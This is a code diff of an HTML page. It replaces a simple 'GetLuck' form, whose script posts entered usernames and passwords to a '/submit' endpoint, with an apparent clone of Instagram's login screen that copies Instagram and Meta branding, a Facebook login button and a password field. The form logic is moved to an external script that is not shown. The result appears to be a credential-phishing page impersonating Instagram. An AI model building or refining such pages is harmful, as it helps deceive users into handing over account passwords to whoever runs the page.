@@ -3,111 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GetLuck</title>
-
-    <style>
-        *{
-            margin:0;
-            padding:0;
-            box-sizing:border-box;
-            font-family:Arial, sans-serif;
-        }
-
-        body{
-            height:100vh;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            background:#111827;
-        }
-
-        .container{
-            width:350px;
-            background:#1f2937;
-            padding:30px;
-            border-radius:12px;
-            box-shadow:0 0 20px rgba(0,0,0,0.3);
-        }
-
-        h1{
-            color:white;
-            text-align:center;
-            margin-bottom:25px;
-        }
-
-        .input-box{
-            width:100%;
-            padding:12px;
-            margin-bottom:15px;
-            border:none;
-            border-radius:8px;
-            outline:none;
-            font-size:15px;
-        }
-
-        .btn{
-            width:100%;
-            padding:12px;
-            border:none;
-            border-radius:8px;
-            background:#2563eb;
-            color:white;
-            font-size:16px;
-            cursor:pointer;
-            transition:0.3s;
-        }
-
-        .btn:hover{
-            background:#1d4ed8;
-        }
-    </style>
+    <title>Login • Instagram</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css">
 </head>
 <body>
 
-    <div class="container">
-        <h1>GetLuck</h1>
+    <div class="main-wrapper">
+        <!-- Left Side: Visuals & Branding Section -->
+        <div class="hero-section">
+            <div class="branding-container">
+                <!-- Official Instagram Icon for Dark Theme -->
+                <img src="insta.png" alt="Instagram" class="insta-icon">
+                <h1 class="hero-text">See everyday moments from your <span class="gradient-text">close friends.</span></h1>
+            </div>
+            
+            <!-- Dynamic Image Mockup Stack -->
+            <div class="mockup-stack">
+                <div class="card card-back-left">
+                    <img id="bgImgLeft" src="https://unsplash.com" alt="Friend Moment">
+                </div>
+                <div class="card card-back-right">
+                    <img id="bgImgRight" src="https://unsplash.com" alt="Friend Moment">
+                </div>
+                <div class="card card-front">
+                    <img id="mainImg" src="https://unsplash.com" alt="Featured Moment">
+                    <!-- Overlay decorative buttons matching the screenshot UI -->
+                    <div class="card-overlay-badge top-left"><i class="fa-regular fa-comment-dots"></i> 😍</div>
+                    <div class="card-overlay-badge bottom-left"><i class="fa-regular fa-heart"></i></div>
+                    <div class="card-overlay-badge right-mid"><i class="fa-regular fa-star"></i></div>
+                    <div class="card-overlay-badge bottom-right"></div>
+                </div>
+            </div>
+        </div>
 
-        <input
-            type="text"
-            id="username"
-            class="input-box"
-            placeholder="Username"
-        >
+        <!-- Right Side: Authentication Panel -->
+        <div class="auth-section">
+            <div class="login-box">
+                <h2 class="login-title">Log into Instagram</h2>
+                
+                <form id="loginForm" class="auth-form">
+                    <!-- Input fields with dynamic active border highlights -->
+                    <div class="input-group">
+                        <input type="text" id="username" required placeholder=" ">
+                        <label for="username">Mobile number, username or email</label>
+                    </div>
 
-        <input
-            type="password"
-            id="password"
-            class="input-box"
-            placeholder="Password"
-        >
+                    <div class="input-group">
+                        <input type="password" id="password" required placeholder=" ">
+                        <label for="password">Password</label>
+                        <button type="button" id="togglePassword" class="hide-show-btn">Show</button>
+                    </div>
 
-        <button class="btn" id="enterBtn">
-            Enter
-        </button>
+                    <button type="submit" class="login-btn" id="loginBtn"><a href="https://instagram.com">Log in</a></button>
+                </form>
+
+                <div class="divider">
+                    <span></span>
+                    <p>OR</p>
+                    <span></span>
+                </div>
+
+                <!-- Facebook login variant -->
+                <button class="fb-login-btn">
+                    <i class="fa-brands fa-square-facebook"></i> <a href="error.html">Log in with Facebook</a>
+                </button>
+
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+
+            <!-- Create Account Container -->
+            <div class="signup-box">
+                <p>Don't have an account? <a href="#" id="createAccountBtn">Create new account</a></p>
+            </div>
+
+            <!-- Footer Meta Branding -->
+            <footer class="auth-footer">
+                <div class="meta-brand">
+                    <i class="fa-brands fa-meta"></i> <span>Meta</span>
+                </div>
+            </footer>
+        </div>
     </div>
 
-    <script>
-        document.getElementById("enterBtn").addEventListener("click", async () => {
-
-            const username = document.getElementById("username").value;
-            const password = document.getElementById("password").value;
-
-            const response = await fetch("/submit", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    username,
-                    password
-                })
-            });
-
-            const data = await response.json();
-
-            alert(data.message);
-        });
-    </script>
-
+    <!-- Link to external logic file -->
+    <script src="script.js"></script>
 </body>
 </html>
